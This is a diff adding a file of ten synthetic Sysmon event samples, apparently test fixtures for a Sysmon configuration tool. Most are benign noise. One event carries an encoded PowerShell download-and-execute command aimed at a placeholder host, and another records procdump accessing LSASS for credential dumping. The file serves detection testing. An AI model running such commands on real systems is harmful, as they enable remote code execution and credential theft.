@@ -1,0 +1,381 @@
+<Events>
+
+<!-- ================================================================
+     SAMPLE SYSMON EVENTS FOR TESTING SysmonConfigManager
+     ================================================================
+     These are realistic Sysmon event samples covering common event types.
+     Use them with Import-SysmonEvent -Path .\samples\SampleEvents.xml
+     or paste individual <Event> blocks interactively.
+     ================================================================ -->
+
+<!-- SAMPLE 1: Process Create (Event ID 1) - Noisy svchost -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T08:30:12.456Z"/>
+    <EventRecordID>100001</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 08:30:12.456</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-1111-2222-3333-444455556666}</Data>
+    <Data Name="ProcessId">8824</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
+    <Data Name="Description">Host Process for Windows Services</Data>
+    <Data Name="Product">Microsoft Windows Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">svchost.exe</Data>
+    <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="LogonGuid">{A1B2C3D4-0000-0000-0000-000000000000}</Data>
+    <Data Name="LogonId">0x3e7</Data>
+    <Data Name="TerminalSessionId">0</Data>
+    <Data Name="IntegrityLevel">System</Data>
+    <Data Name="Hashes">SHA256=ABC123DEF456789012345678901234567890123456789012345678901234</Data>
+    <Data Name="ParentProcessGuid">{A1B2C3D4-0001-0002-0003-000400050006}</Data>
+    <Data Name="ParentProcessId">624</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
+    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 2: Process Create (Event ID 1) - Suspicious PowerShell -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T09:45:33.789Z"/>
+    <EventRecordID>100042</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-21-1234567890-1234567890-1234567890-1001"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+    <Data Name="UtcTime">2026-01-15 09:45:33.789</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-2222-3333-4444-555566667777}</Data>
+    <Data Name="ProcessId">15432</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft Windows Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQBiAGMALgB4AHkAegAvAHAAJwApAA==</Data>
+    <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+    <Data Name="User">CORP\jsmith</Data>
+    <Data Name="LogonGuid">{A1B2C3D4-1111-2222-3333-444455556667}</Data>
+    <Data Name="LogonId">0x123456</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA256=DEF789012345678901234567890123456789012345678901234567890123</Data>
+    <Data Name="ParentProcessGuid">{A1B2C3D4-3333-4444-5555-666677778888}</Data>
+    <Data Name="ParentProcessId">5678</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentUser">CORP\jsmith</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 3: Network Connection (Event ID 3) - Noisy Windows Update -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>3</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>3</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T10:00:05.123Z"/>
+    <EventRecordID>100100</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 10:00:05.123</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-4444-5555-6666-777788889999}</Data>
+    <Data Name="ProcessId">1234</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="Protocol">tcp</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">10.0.1.50</Data>
+    <Data Name="SourceHostname">WORKSTATION01.corp.local</Data>
+    <Data Name="SourcePort">49832</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">23.35.229.160</Data>
+    <Data Name="DestinationHostname">download.windowsupdate.com</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationPortName">https</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 4: DNS Query (Event ID 22) - Noisy Microsoft telemetry -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>22</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>22</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T10:15:22.456Z"/>
+    <EventRecordID>100200</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 10:15:22.456</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-5555-6666-7777-888899990000}</Data>
+    <Data Name="ProcessId">1234</Data>
+    <Data Name="QueryName">settings-win.data.microsoft.com</Data>
+    <Data Name="QueryStatus">0</Data>
+    <Data Name="QueryResults">type: 5 v4.a.]b.c.d.microsoft.com;::ffff:20.50.73.10;</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 5: File Create (Event ID 11) - Noisy temp file -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>11</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>11</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T11:00:01.789Z"/>
+    <EventRecordID>100300</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 11:00:01.789</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-6666-7777-8888-999900001111}</Data>
+    <Data Name="ProcessId">4567</Data>
+    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+    <Data Name="TargetFilename">C:\Users\jsmith\AppData\Local\Google\Chrome\User Data\Default\Cache\data_3</Data>
+    <Data Name="CreationUtcTime">2026-01-15 11:00:01.789</Data>
+    <Data Name="User">CORP\jsmith</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 6: Registry Event (Event ID 13) - Noisy but legitimate -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T11:30:45.123Z"/>
+    <EventRecordID>100400</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2026-01-15 11:30:45.123</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-7777-8888-9999-000011112222}</Data>
+    <Data Name="ProcessId">8824</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="TargetObject">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational\Enabled</Data>
+    <Data Name="Details">DWORD (0x00000001)</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 7: Process Create (Event ID 1) - Legitimate IT admin tool (noise) -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T14:22:10.321Z"/>
+    <EventRecordID>100500</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 14:22:10.321</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-8888-9999-0000-111122223333}</Data>
+    <Data Name="ProcessId">9988</Data>
+    <Data Name="Image">C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data>
+    <Data Name="FileVersion">9.1.2</Data>
+    <Data Name="Description">splunkd</Data>
+    <Data Name="Product">Splunk Universal Forwarder</Data>
+    <Data Name="Company">Splunk Inc.</Data>
+    <Data Name="OriginalFileName">splunkd.exe</Data>
+    <Data Name="CommandLine">"C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe" service</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="LogonGuid">{A1B2C3D4-0000-0000-0000-000000000000}</Data>
+    <Data Name="LogonId">0x3e7</Data>
+    <Data Name="TerminalSessionId">0</Data>
+    <Data Name="IntegrityLevel">System</Data>
+    <Data Name="Hashes">SHA256=FED987654321098765432109876543210987654321098765432109876543</Data>
+    <Data Name="ParentProcessGuid">{A1B2C3D4-0001-0002-0003-000400050006}</Data>
+    <Data Name="ParentProcessId">624</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
+    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 8: Image Load (Event ID 7) - Noisy signed DLL -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>7</EventID>
+    <Version>3</Version>
+    <Level>4</Level>
+    <Task>7</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T15:00:00.000Z"/>
+    <EventRecordID>100600</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-01-15 15:00:00.000</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-9999-0000-1111-222233334444}</Data>
+    <Data Name="ProcessId">3456</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="ImageLoaded">C:\Windows\System32\kernel32.dll</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">Windows NT BASE API Client DLL</Data>
+    <Data Name="Product">Microsoft Windows Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">kernel32</Data>
+    <Data Name="Hashes">SHA256=112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF</Data>
+    <Data Name="Signed">true</Data>
+    <Data Name="Signature">Microsoft Windows</Data>
+    <Data Name="SignatureStatus">Valid</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 9: Process Access (Event ID 10) - Suspicious LSASS access -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>10</EventID>
+    <Version>3</Version>
+    <Level>4</Level>
+    <Task>10</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T16:30:15.999Z"/>
+    <EventRecordID>100700</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-21-1234567890-1234567890-1234567890-1001"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">technique_id=T1003,technique_name=Credential Dumping</Data>
+    <Data Name="UtcTime">2026-01-15 16:30:15.999</Data>
+    <Data Name="SourceProcessGUID">{A1B2C3D4-AAAA-BBBB-CCCC-DDDDEEEEFFFF}</Data>
+    <Data Name="SourceProcessId">7890</Data>
+    <Data Name="SourceThreadId">11234</Data>
+    <Data Name="SourceImage">C:\Users\jsmith\Downloads\procdump64.exe</Data>
+    <Data Name="TargetProcessGUID">{A1B2C3D4-0000-1111-2222-333344445555}</Data>
+    <Data Name="TargetProcessId">680</Data>
+    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+    <Data Name="GrantedAccess">0x1FFFFF</Data>
+    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9f3c4|C:\Windows\System32\KERNELBASE.dll+2c56e</Data>
+    <Data Name="SourceUser">CORP\jsmith</Data>
+    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<!-- SAMPLE 10: Pipe Event (Event ID 17) - Named pipe creation -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>17</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>17</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-01-15T17:00:00.000Z"/>
+    <EventRecordID>100800</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="8"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">CreatePipe</Data>
+    <Data Name="UtcTime">2026-01-15 17:00:00.000</Data>
+    <Data Name="ProcessGuid">{A1B2C3D4-BBBB-CCCC-DDDD-EEEEFFFF0000}</Data>
+    <Data Name="ProcessId">4567</Data>
+    <Data Name="PipeName">\PSHost.133456789.1234.DefaultAppDomain.powershell</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">CORP\jsmith</Data>
+  </EventData>
+</Event>
+
+</Events>
